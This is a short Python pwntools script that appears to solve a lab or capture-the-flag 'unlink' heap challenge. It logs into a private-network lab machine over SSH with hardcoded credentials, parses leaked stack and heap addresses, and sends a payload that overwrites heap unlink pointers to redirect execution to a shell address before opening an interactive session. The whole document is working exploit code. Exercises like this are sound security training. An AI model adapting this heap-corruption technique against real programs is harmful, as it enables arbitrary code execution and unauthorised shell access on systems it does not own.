from pwn import *
connect = ssh(host="192.168.191.128", port=22, user="seed", password="dees")
op = connect. run("./unlink")
shell_addr = 0x0804854b
op.recvuntil(b"here is stack address leak: ")
stack_addr = int(op. recv(10), 16)
op.recvuntil(b"here is heap address leak: ")
heap_addr = int(op. recv(10), 16)
print("stackAddress: ", hex(stack_addr))
print("heapAddress :", hex(heap_addr))
op.recvline()
ebp_4 = stack_addr + 0x10
heap_c = heap_addr + 0xc
payload = p32(shell_addr)*4 + p32(heap_c) + p32(ebp_4)
op.send(payload)
op.interactive()
